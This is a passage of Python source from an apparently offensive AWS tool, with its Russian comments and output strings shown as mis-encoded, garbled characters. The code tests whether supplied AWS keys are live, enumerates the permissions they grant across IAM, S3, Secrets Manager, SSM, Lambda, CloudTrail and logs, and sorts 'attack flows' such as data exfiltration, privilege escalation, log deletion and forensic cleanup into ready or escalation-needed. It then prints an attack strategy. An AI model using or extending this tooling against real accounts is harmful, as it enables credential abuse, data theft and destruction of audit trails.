        if operation_type == "write" or "create" in service_name or "delete" in service_name:
            return self.critical_timeout
        
        # –ë—ã—Å—Ç—Ä—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ (list, describe)
        if any(keyword in service_name for keyword in ["list", "describe", "get"]):
            return self.base_timeout
        
        # –°—Ä–µ–¥–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏
        return min(self.base_timeout * 2, self.max_timeout)
    
    def _calculate_backoff_delay(self, attempt: int) -> float:
        """–í—ã—á–∏—Å–ª—è–µ—Ç –∑–∞–¥–µ—Ä–∂–∫—É –¥–ª—è —ç–∫—Å–ø–æ–Ω–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–≥–æ backoff"""
        return min(self.base_timeout * (self.backoff_multiplier ** attempt), self.max_timeout)
    
    def _is_cache_valid(self, service_name: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å –∫—ç—à–∞ –¥–ª—è —Å–µ—Ä–≤–∏—Å–∞"""
        if service_name not in self.service_cache:
            return False
        
        cache_time = self.service_cache[service_name].get('timestamp', 0)
        return (time.time() - cache_time) < self.cache_ttl
    
    def _update_performance_stats(self, service_name: str, response_time: float, success: bool):
        """–û–±–Ω–æ–≤–ª—è–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏"""
        self.performance_stats['total_requests'] += 1
        
        if success:
            self.performance_stats['successful_requests'] += 1
        else:
            self.performance_stats['failed_requests'] += 1
        
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è –æ—Ç–≤–µ—Ç–∞ –¥–ª—è —Å–µ—Ä–≤–∏—Å–∞
        if service_name not in self.performance_stats['service_response_times']:
            self.performance_stats['service_response_times'][service_name] = []
        
        self.performance_stats['service_response_times'][service_name].append(response_time)
        
        # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é –¥–æ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö 10 –∑–∞–ø—Ä–æ—Å–æ–≤
        if len(self.performance_stats['service_response_times'][service_name]) > 10:
            self.performance_stats['service_response_times'][service_name] = \
                self.performance_stats['service_response_times'][service_name][-10:]
    
    def _get_optimized_timeout(self, service_name: str) -> int:
        """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ç–∞–π–º–∞—É—Ç –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏—Å—Ç–æ—Ä–∏—á–µ—Å–∫–∏—Ö –¥–∞–Ω–Ω—ã—Ö"""
        if service_name not in self.performance_stats['service_response_times']:
            return self._get_adaptive_timeout(service_name)
        
        recent_times = self.performance_stats['service_response_times'][service_name]
        if not recent_times:
            return self._get_adaptive_timeout(service_name)
        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º 95-–π –ø—Ä–æ—Ü–µ–Ω—Ç–∏–ª—å –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ç–∞–π–º–∞—É—Ç–∞
        avg_time = sum(recent_times) / len(recent_times)
        return min(int(avg_time * 3), self.max_timeout)
    
    def _validate_key_format(self, access_key: str, secret_key: str) -> Dict[str, Any]:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç —Ñ–æ—Ä–º–∞—Ç AWS –∫–ª—é—á–µ–π"""
        errors = []
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ Access Key ID
        if not access_key:
            errors.append("Access Key ID –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º")
        elif not isinstance(access_key, str):
            errors.append("Access Key ID –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π")
        elif len(access_key) != 20:
            errors.append("Access Key ID –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ä–æ–≤–Ω–æ 20 —Å–∏–º–≤–æ–ª–æ–≤")
        elif not access_key.startswith('AKIA'):
            errors.append("Access Key ID –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å 'AKIA'")
        elif not access_key.replace('AKIA', '').isalnum():
            errors.append("Access Key ID —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ Secret Access Key
        if not secret_key:
            errors.append("Secret Access Key –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º")
        elif not isinstance(secret_key, str):
            errors.append("Secret Access Key –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π")
        elif len(secret_key) != 40:
            errors.append("Secret Access Key –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ä–æ–≤–Ω–æ 40 —Å–∏–º–≤–æ–ª–æ–≤")
        elif not all(c.isalnum() or c in '+/=' for c in secret_key):
            errors.append("Secret Access Key —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã")
        
        return {
            'valid': len(errors) == 0,
            'errors': errors
        }
    
    def _check_aws_connectivity(self, region: str = "us-east-1") -> Dict[str, Any]:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å AWS —Å–µ—Ä–≤–∏—Å–æ–≤"""
        try:
            # –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ AWS —á–µ—Ä–µ–∑ DNS
            import socket
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å AWS endpoints
            endpoints = [
                f"sts.{region}.amazonaws.com",
                f"iam.{region}.amazonaws.com",
                "sts.amazonaws.com"  # –ì–ª–æ–±–∞–ª—å–Ω—ã–π endpoint
            ]
            
            for endpoint in endpoints:
                try:
                    socket.create_connection((endpoint, 443), timeout=3)
                    return {'available': True, 'endpoint': endpoint}
                except:
                    continue
            
            return {'available': False, 'error': 'AWS endpoints –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã'}
            
        except Exception as e:
            return {'available': False, 'error': f'–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}'}
    
    def _quick_liveness_check(self, access_key: str, secret_key: str, region: str = "us-east-1") -> Dict[str, Any]:
        """–ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∂–∏–≤–æ—Å—Ç–∏ –∫–ª—é—á–∞ (–±–µ–∑ –ø–æ–ª–Ω–æ–π –≤–∞–ª–∏–¥–∞—Ü–∏–∏)"""
        try:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ç–∞–π–º–∞—É—Ç –¥–ª—è –±—ã—Å—Ç—Ä–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏
            config = Config(
                region_name=region,
                retries={'max_attempts': 1},
                read_timeout=2,
                connect_timeout=2
            )
            
            sts_client = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                config=config
            )
            
            # –ë—ã—Å—Ç—Ä—ã–π –∑–∞–ø—Ä–æ—Å –±–µ–∑ –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
            response = sts_client.get_caller_identity()
            
            return {
                'alive': True,
                'account_id': response.get('Account', 'Unknown'),
                'response_time': 0  # –ë—É–¥–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–æ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –º–µ—Ç–æ–¥–µ
            }
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code in ['InvalidUserID.NotFound', 'SignatureDoesNotMatch', 'InvalidAccessKeyId']:
                return {'alive': False, 'error': '–ù–µ–≤–µ—Ä–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ'}
            elif error_code in ['RequestLimitExceeded', 'ThrottlingException']:
                return {'alive': True, 'error': 'Rate limit (–∫–ª—é—á –∂–∏–≤–æ–π, –Ω–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω)'}
            else:
                return {'alive': False, 'error': f'AWS –æ—à–∏–±–∫–∞: {error_code}'}
        except Exception as e:
            return {'alive': False, 'error': f'–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {str(e)}'}
    
    def validate_key(self, access_key: str, secret_key: str, region: str = "us-east-1") -> Dict[str, Any]:
        """–í–∞–ª–∏–¥–∏—Ä—É–µ—Ç AWS –∫–ª—é—á–∏ —Å –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã–º–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞–º–∏"""
        start_time = time.time()
        
        print(f"{Fore.CYAN}üîç –ü—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∫–ª—é—á–µ–π...{Fore.RESET}")
        
        # 1Ô∏è‚É£ –ü–†–û–í–ï–†–ö–ê –§–û–†–ú–ê–¢–ê –ö–õ–Æ–ß–ï–ô
        format_check = self._validate_key_format(access_key, secret_key)
        if not format_check['valid']:
            print(f"{Fore.RED}‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–ª—é—á–µ–π:{Fore.RESET}")
            for error in format_check['errors']:
                print(f"   ‚Ä¢ {error}")
            return {
                'success': False,
                'error': '–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–ª—é—á–µ–π',
                'format_errors': format_check['errors']
            }
        
        print(f"{Fore.GREEN}‚úÖ –§–æ—Ä–º–∞—Ç –∫–ª—é—á–µ–π –∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω{Fore.RESET}")
        
        # 2Ô∏è‚É£ –ü–†–û–í–ï–†–ö–ê –î–û–°–¢–£–ü–ù–û–°–¢–ò AWS
        connectivity_check = self._check_aws_connectivity(region)
        if not connectivity_check['available']:
            print(f"{Fore.RED}‚ùå AWS –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: {connectivity_check['error']}{Fore.RESET}")
            return {
                'success': False,
                'error': f'AWS –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: {connectivity_check["error"]}'
            }
        
        print(f"{Fore.GREEN}‚úÖ AWS –¥–æ—Å—Ç—É–ø–µ–Ω ({connectivity_check['endpoint']}){Fore.RESET}")
        
        # 3Ô∏è‚É£ –ë–´–°–¢–†–ê–Ø –ü–†–û–í–ï–†–ö–ê –ñ–ò–í–û–°–¢–ò –ö–õ–Æ–ß–ê
        print(f"{Fore.CYAN}‚ö° –ü—Ä–æ–≤–µ—Ä–∫–∞ –∂–∏–≤–æ—Å—Ç–∏ –∫–ª—é—á–∞...{Fore.RESET}")
        liveness_check = self._quick_liveness_check(access_key, secret_key, region)
        
        if not liveness_check['alive']:
            print(f"{Fore.RED}‚ùå –ö–ª—é—á –Ω–µ–∞–∫—Ç–∏–≤–µ–Ω: {liveness_check['error']}{Fore.RESET}")
            return {
                'success': False,
                'error': f'–ö–ª—é—á –Ω–µ–∞–∫—Ç–∏–≤–µ–Ω: {liveness_check["error"]}'
            }
        
        print(f"{Fore.GREEN}‚úÖ –ö–ª—é—á –∞–∫—Ç–∏–≤–µ–Ω (Account: {liveness_check['account_id']}){Fore.RESET}")
        print(f"{Fore.CYAN}üöÄ –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –ø–æ–ª–Ω–æ–π –≤–∞–ª–∏–¥–∞—Ü–∏–∏...{Fore.RESET}")
        print()
        
        # 4Ô∏è‚É£ –ü–û–õ–ù–ê–Ø –í–ê–õ–ò–î–ê–¶–ò–Ø –ö–õ–Æ–ß–ê
        try:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∞–¥–∞–ø—Ç–∏–≤–Ω—ã–π —Ç–∞–π–º–∞—É—Ç –¥–ª—è STS
            timeout = self._get_adaptive_timeout("sts_get_caller_identity")
            
            config = Config(
                region_name=region,
                retries={'max_attempts': self.retry_attempts},
                read_timeout=timeout,
                connect_timeout=timeout
            )
            
            sts_client = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                config=config
            )
            
            response = sts_client.get_caller_identity()
            
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
            response_time = time.time() - start_time
            self._update_performance_stats("sts_get_caller_identity", response_time, True)
            
            return {
                'success': True,
                'account_id': response['Account'],
                'arn': response['Arn'],
                'user_id': response['UserId'],
                'username': response['Arn'].split('/')[-1] if '/' in response['Arn'] else 'root'
            }
            
        except Exception as e:
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –¥–ª—è –æ—à–∏–±–∫–∏
            response_time = time.time() - start_time
            self._update_performance_stats("sts_get_caller_identity", response_time, False)
            
            return {
                'success': False,
                'error': str(e)
            }
    
    def analyze_attack_flows(self, permissions_result: Dict, escalation_result: Dict) -> Dict[str, Any]:
        """–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Ñ–ª–æ—É –∞—Ç–∞–∫ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∏ —Ä–æ–ª–µ–π"""
        flow_analysis = {
            'available_flows': [],
            'blocked_flows': [],
            'escalation_opportunities': [],
            'recommendations': []
        }
        
        accessible_services = []
        for service, result in permissions_result.get('results', {}).items():
            if result.get('accessible', False):
                accessible_services.append(service)
        
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –∫–∞–∂–¥—ã–π —Ñ–ª–æ—É –∞—Ç–∞–∫–∏
        for flow_key, flow_info in self.attack_flows.items():
            required_services = flow_info['required_services']
            escalation_roles = flow_info['escalation_roles']
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Å–µ—Ä–≤–∏—Å–æ–≤
            available_services = [s for s in required_services if s in accessible_services]
            missing_services = [s for s in required_services if s not in accessible_services]
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Ä–æ–ª–µ–π –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏
            available_roles = []
            if 'error' not in escalation_result:
                for role_name, role_data in escalation_result.get('roles_analysis', {}).items():
                    for policy_arn in role_data.get('attached_policies', []):
                        for escalation_role in escalation_roles:
                            if escalation_role in policy_arn:
                                available_roles.append({
                                    'role_name': role_name,
                                    'policy_arn': policy_arn,
                                    'escalation_score': role_data.get('escalation_score', 0)
                                })
            
            flow_status = {
                'flow_key': flow_key,
                'flow_name': flow_info['name'],
                'description': flow_info['description'],
                'required_services': required_services,
                'available_services': available_services,
                'missing_services': missing_services,
                'escalation_roles': escalation_roles,
                'available_escalation_roles': available_roles,
                'completion_percentage': int((len(available_services) / len(required_services)) * 100) if required_services else 0
            }
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å—Ç–∞—Ç—É—Å —Ñ–ª–æ—É
            if len(available_services) == len(required_services):
                # –í—Å–µ —Å–µ—Ä–≤–∏—Å—ã –¥–æ—Å—Ç—É–ø–Ω—ã
                flow_status['status'] = 'READY'
                flow_status['action'] = '–ú–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∞—Ç–∞–∫—É –ø—Ä—è–º–æ —Å–µ–π—á–∞—Å'
                flow_analysis['available_flows'].append(flow_status)
            elif len(available_services) > 0 and available_roles:
                # –ß–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–µ–Ω + –µ—Å—Ç—å —Ä–æ–ª–∏ –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏
                flow_status['status'] = 'ESCALATION_NEEDED'
                flow_status['action'] = f'–ù—É–∂–Ω–∞ —ç—Å–∫–∞–ª–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Ä–æ–ª–∏: {", ".join([r["role_name"] for r in available_roles])}'
                flow_analysis['escalation_opportunities'].append(flow_status)
            elif len(available_services) > 0:
                # –ß–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–µ–Ω, –Ω–æ –Ω–µ—Ç —Ä–æ–ª–µ–π –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏
                flow_status['status'] = 'BLOCKED_NO_ESCALATION'
                flow_status['action'] = '–ù–µ—Ç —Ä–æ–ª–µ–π –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏ - –Ω—É–∂–Ω—ã –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞'
                flow_analysis['blocked_flows'].append(flow_status)
            else:
                # –ù–∏—á–µ–≥–æ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ
                flow_status['status'] = 'BLOCKED'
                flow_status['action'] = '–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Ç—Ä–µ–±—É–µ–º—ã–º —Å–µ—Ä–≤–∏—Å–∞–º'
                flow_analysis['blocked_flows'].append(flow_status)
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏
        flow_analysis['recommendations'] = self._generate_flow_recommendations(flow_analysis)
        
        return flow_analysis
    
    def _generate_flow_recommendations(self, flow_analysis: Dict) -> List[str]:
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –∞–Ω–∞–ª–∏–∑–∞ —Ñ–ª–æ—É"""
        recommendations = []
        
        # –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –¥–ª—è –≥–æ—Ç–æ–≤—ã—Ö —Ñ–ª–æ—É
        if flow_analysis['available_flows']:
            recommendations.append(f"üöÄ –ì–û–¢–û–í–´–ï –ö –í–´–ü–û–õ–ù–ï–ù–ò–Æ ({len(flow_analysis['available_flows'])}):")
            for flow in flow_analysis['available_flows']:
                recommendations.append(f"   ‚Ä¢ {flow['flow_name']} - {flow['action']}")
        
        # –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –¥–ª—è —Ñ–ª–æ—É —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é —ç—Å–∫–∞–ª–∞—Ü–∏–∏
        if flow_analysis['escalation_opportunities']:
            recommendations.append(f"\n‚ö° –¢–†–ï–ë–£–Æ–¢ –≠–°–ö–ê–õ–ê–¶–ò–ò ({len(flow_analysis['escalation_opportunities'])}):")
            for flow in flow_analysis['escalation_opportunities']:
                recommendations.append(f"   ‚Ä¢ {flow['flow_name']} ({flow['completion_percentage']}% –≥–æ—Ç–æ–≤)")
                recommendations.append(f"     {flow['action']}")
                
                # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Ä–æ–ª–∏ –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏
                if flow['available_escalation_roles']:
                    recommendations.append(f"     üîë –†–æ–ª–∏ –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏:")
                    for role in flow['available_escalation_roles'][:2]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–µ 2
                        recommendations.append(f"       - {role['role_name']} (–±–∞–ª–ª: {role['escalation_score']})")
        
        # –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –¥–ª—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ–ª–æ—É
        if flow_analysis['blocked_flows']:
            recommendations.append(f"\n‚ùå –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–´ ({len(flow_analysis['blocked_flows'])}):")
            for flow in flow_analysis['blocked_flows'][:3]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–µ 3
                recommendations.append(f"   ‚Ä¢ {flow['flow_name']} - {flow['action']}")
        
        # –û–±—â–∏–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏
        if flow_analysis['available_flows'] or flow_analysis['escalation_opportunities']:
            recommendations.append(f"\nüí° –°–¢–†–ê–¢–ï–ì–ò–Ø –ê–¢–ê–ö–ò:")
            recommendations.append("   1. –ù–∞—á–Ω–∏—Ç–µ —Å –≥–æ—Ç–æ–≤—ã—Ö —Ñ–ª–æ—É –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞")
            recommendations.append("   2. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ä–æ–ª–∏ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –¥–ª—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞")
            recommendations.append("   3. –ö–æ–º–±–∏–Ω–∏—Ä—É–π—Ç–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ–ª–æ—É –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ —ç—Ñ—Ñ–µ–∫—Ç–∞")
            recommendations.append("   4. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–µ—Ö–Ω–∏–∫–∏ –∏–∑ –ø–∞–ø–∫–∏ techniques/ –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏")
        
        return recommendations
    
    def _determine_flows_to_check(self, filters: Dict[str, bool]) -> List[str]:
        """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∫–∞–∫–∏–µ —Ñ–ª–æ—É –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ñ–∏–ª—å—Ç—Ä–æ–≤"""
        all_flows = {
            'critical': [
                'IAM User Escalation', 'IAM Role Escalation', 'Secrets Manager',
                'Systems Manager', 'S3 Data Exfiltration', 'EC2 Management Attack',
                'Lambda Privilege Escalation', 'RDS Data Extraction', 'Log Deletion Attack', 'Forensic Cleanup Attack'
            ],
            'high': ['Security & Compliance'],
            'medium': ['IAM Groups Escalation'],
            'low': []
        }
        
        flows_to_check = []
        
        # –ï—Å–ª–∏ –Ω–µ—Ç —Ñ–∏–ª—å—Ç—Ä–æ–≤, –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤—Å–µ
        if not any(filters.values()):
            return list(all_flows['critical'] + all_flows['high'] + all_flows['medium'] + all_flows['low'])
        
        # –§–∏–ª—å—Ç—Ä –ø–æ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞–º
        if filters.get('critical'):
            flows_to_check.extend(all_flows['critical'])
        if filters.get('high'):
            flows_to_check.extend(all_flows['high'])
        if filters.get('medium'):
            flows_to_check.extend(all_flows['medium'])
        if filters.get('low'):
            flows_to_check.extend(all_flows['low'])
        
        # –ï—Å–ª–∏ –Ω–µ –≤—ã–±—Ä–∞–Ω –Ω–∏ –æ–¥–∏–Ω –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç, –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤—Å–µ
        if not any([filters.get('critical'), filters.get('high'), filters.get('medium'), filters.get('low')]):
            flows_to_check = list(all_flows['critical'] + all_flows['high'] + all_flows['medium'] + all_flows['low'])
        
        return flows_to_check
    
    def check_service_permissions(self, access_key: str, secret_key: str, region: str, filters: Dict[str, bool] = None) -> Dict[str, Any]:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–∞–∑–ª–∏—á–Ω—ã–º —Å–µ—Ä–≤–∏—Å–∞–º —Å —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–µ–π"""
        if filters is None:
            filters = {}
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–∞–∫–∏–µ —Ñ–ª–æ—É –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ñ–∏–ª—å—Ç—Ä–æ–≤
        flows_to_check = self._determine_flows_to_check(filters)
        
        print(f"{Fore.CYAN}üìä –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ ...{Fore.RESET}")
        print(f"{Fore.CYAN}{'‚îÄ'*37}{Fore.RESET}")
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∞–∫—Ç–∏–≤–Ω—ã–µ —Ñ–∏–ª—å—Ç—Ä—ã
        active_filters = [k for k, v in filters.items() if v]
        if active_filters:
            print(f"{Fore.YELLOW}üîç –ê–∫—Ç–∏–≤–Ω—ã–µ —Ñ–∏–ª—å—Ç—Ä—ã: {', '.join(active_filters)}{Fore.RESET}")
            print(f"{Fore.YELLOW}üìã –ü—Ä–æ–≤–µ—Ä—è–µ–º—ã–µ —Ñ–ª–æ—É: {', '.join(flows_to_check)}{Fore.RESET}")
            print()
        
        results = {}
        total_score = 0
        escalation_results = {}  # –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø–æ —Ñ–ª–æ—É
        
        # üîÑ –ê–î–ê–ü–¢–ò–í–ù–ê–Ø –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø - –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ —Ç–∞–π–º–∞—É—Ç—ã
        base_config = Config(
            region_name=region,
            retries={'max_attempts': self.retry_attempts},
            read_timeout=self.base_timeout,
            connect_timeout=self.base_timeout
        )
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∏–µ–Ω—Ç—ã –¥–ª—è –≤—Å–µ—Ö —Å–µ—Ä–≤–∏—Å–æ–≤ —Å –∞–¥–∞–ø—Ç–∏–≤–Ω–æ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π
        try:
            sts_client = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            iam_client = boto3.client('iam', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            s3_client = boto3.client('s3', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            rds_client = boto3.client('rds', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            lambda_client = boto3.client('lambda', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            secrets_client = boto3.client('secretsmanager', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            kms_client = boto3.client('kms', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            cloudwatch_client = boto3.client('cloudwatch', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            ssm_client = boto3.client('ssm', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            cloudfront_client = boto3.client('cloudfront', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            events_client = boto3.client('events', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            cloudtrail_client = boto3.client('cloudtrail', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
            logs_client = boto3.client('logs', aws_access_key_id=access_key, aws_secret_access_key=secret_key, config=base_config)
        except Exception as e:
            return {'error': f'–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∫–ª–∏–µ–Ω—Ç–æ–≤: {e}'}
        
        # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø–æ—Å–ª–µ –±–ª–æ–∫–∞
        def check_escalation_block(flow_name: str, required_services: list, escalation_roles: list = None):
            accessible_services = [s for s in required_services if results.get(s, {}).get('accessible', False)]
